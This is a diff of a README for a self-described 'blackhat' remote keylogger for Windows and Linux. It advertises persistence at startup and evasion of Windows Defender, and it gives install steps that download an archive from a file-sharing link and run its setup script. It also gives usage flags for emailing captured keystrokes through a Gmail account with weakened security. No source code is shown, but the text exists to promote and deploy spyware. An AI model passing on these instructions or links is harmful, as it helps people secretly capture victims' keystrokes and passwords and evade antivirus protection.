@@ -9,19 +9,19 @@ Remote persistent keylogger for Windows and Linux.
 - Starts with system startup.
 - Works with Linux and Windows.
 - NO SPAMM EMAIL 
-- IT BYPASS windows defender 2019 new update
+- IT BYPASS windows defender 2019 
 
 # installation guide 
 
-1. cd /opt/
+1. sudo apt-get install wine32
 
-2. git clone https://github.com/mRanonyMousTZ/mr-robot-keylogger-2019
+2. DOWNLOAD IT here https://my.pcloud.com/publink/show?code=XZcFhhkZeLg298b0zoSgdpj1J3IkAJsSrylk
 
-3. cd mr-robot-keylogger-2019
+3. cd MrRobot-2019-2020
 
 4. chmod +x *
 
-5. ./install.sh
+5. ./setup.sh
 
 6. after that you need gmail account and before anything make sure you turn it on lesssecureapps
    to do so use this link https://myaccount.google.com/lesssecureapps
@@ -35,7 +35,7 @@ Remote persistent keylogger for Windows and Linux.
 
 # usage 
 
-usage: runme.py [-h] [-i INTERVAL] [-w] [-l] [-e EMAIL] [-p PASSWORD] -o OUT
+usage: run.py [-h] [-i INTERVAL] [-w] [-l] [-e EMAIL] [-p PASSWORD] -o OUT
 
 MR ANONYMOUS BLACKHAT KEYLOGGER v2.0
 
